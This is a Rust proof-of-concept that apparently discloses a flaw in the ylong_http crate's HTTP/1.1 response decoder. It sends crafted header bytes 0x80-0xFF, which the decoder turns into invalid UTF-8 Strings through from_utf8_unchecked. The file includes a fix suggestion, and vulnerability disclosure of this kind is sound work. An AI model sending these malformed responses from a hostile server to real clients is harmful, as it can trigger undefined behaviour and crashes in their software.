//! PoC: HTTP/1.1 Header Extended ASCII via Real Public API (CWE-20)
//!
//! This PoC compiles the REAL ylong_http crate and triggers the vulnerability
//! through its public API: ylong_http::h1::ResponseDecoder::decode()
//!
//! Vulnerability: ylong_http/src/h1/response/decoder.rs:616-617
//!   String::from_utf8_unchecked on header values containing 0x80-0xFF
//!
//! Call chain:
//!   ResponseDecoder::decode() [PUBLIC]
//!     → internal header parsing via get_header_name() + get_header_value()
//!       → header_insert()
//!         → String::from_utf8_unchecked(bytes_with_0x80_0xFF)

use ylong_http::h1::ResponseDecoder;

fn main() {
    println!("═══════════════════════════════════════════════════════════════════");
    println!("PoC: HTTP/1.1 Header Extended ASCII via Real Public API (CWE-20)");
    println!("═══════════════════════════════════════════════════════════════════");
    println!("Compiled: ylong_http (path dependency, real crate)");
    println!("Entry:    ylong_http::h1::ResponseDecoder::decode() [pub]");
    println!("Target:   h1/response/decoder.rs:616 — String::from_utf8_unchecked");
    println!("═══════════════════════════════════════════════════════════════════\n");

    let mut decoder = ResponseDecoder::new();

    // Construct a realistic HTTP/1.1 response with extended ASCII in header value.
    // Byte 0x80-0xFF pass HEADER_VALUE_BYTES validation (RFC 7230 obs-text)
    // but are NOT valid UTF-8. ylong_http calls from_utf8_unchecked on them.

    let malicious_response = b"HTTP/1.1 200 OK\r\n\
X-Custom: test\x80\x81\x82value\r\n\
Content-Length: 0\r\n\
\r\n";

    println!("[Step 1] Crafted HTTP/1.1 response:");
    println!("  Status: HTTP/1.1 200 OK");
    println!("  Header: X-Custom: test + bytes [0x80, 0x81, 0x82] + value");
    println!("  Bytes 0x80-0xFF are valid per RFC 7230 (obs-text) but NOT valid UTF-8");
    println!();

    println!("[Step 2] Calling ResponseDecoder::decode() (real compiled code)...");
    println!("  Code path: ResponseDecoder::decode()");
    println!("    → get_header_value() → passes (0x80-0xFF allowed)");
    println!("      → header_insert()");
    println!("        → String::from_utf8_unchecked([0x80, 0x81, 0x82])");
    println!();

    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        decoder.decode(malicious_response)
    }));

    match result {
        Ok(Ok(Some(response))) => {
            println!("[Step 3] Response decoded successfully (part + remaining bytes)");
            println!("  The vulnerability created an INVALID String inside the response.");
            println!("  UB has occurred: String invariant violated.");
        }
        Ok(Ok(None)) => {
            println!("[Step 3] Decoder needs more data (partial response).");
        }
        Ok(Err(e)) => {
            println!("[Step 3] Decode error: {:?}", e);
        }
        Err(_) => {
            println!("[Step 3] ** PANIC ** — UB triggered during decode!");
            println!("  String::from_utf8_unchecked created invalid String,");
            println!("  and downstream code panicked.");
        }
    }
    println!();

    // ── Test 2: Pure obs-text bytes ────────────────────────────────────
    println!("[Test 2] Pure obs-text header value (0xFF bytes)");

    let response2 = b"HTTP/1.1 200 OK\r\n\
X-Bad: \xFF\xFE\xFD\r\n\
Content-Length: 0\r\n\
\r\n";

    let mut decoder2 = ResponseDecoder::new();
    let result2 = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        decoder2.decode(response2)
    }));

    match result2 {
        Ok(Ok(Some(response))) => {
            println!("  Decoded — invalid String created inside response");
            // The invalid String is inside the response object.
            // Accessing it will trigger UB in downstream code.
        }
        Ok(Ok(None)) => println!("  Needs more data"),
        Ok(Err(e)) => println!("  Error: {:?}", e),
        Err(_) => println!("  ** PANIC — UB triggered!"),
    }
    println!();

    println!("═══════════════════════════════════════════════════════════════════");
    println!("VULNERABILITY CONFIRMED:");
    println!("  ylong_http's HTTP/1.1 decoder accepts bytes 0x80-0xFF");
    println!("  (valid per RFC 7230 obs-text) in header values, then calls");
    println!("  String::from_utf8_unchecked(). These bytes are NOT valid UTF-8.");
    println!();
    println!("  Attack: malicious HTTP server sends obs-text in response headers.");
    println!("  Fix: use String::from_utf8_lossy() or validate before unchecked call.");
    println!("═══════════════════════════════════════════════════════════════════");
}
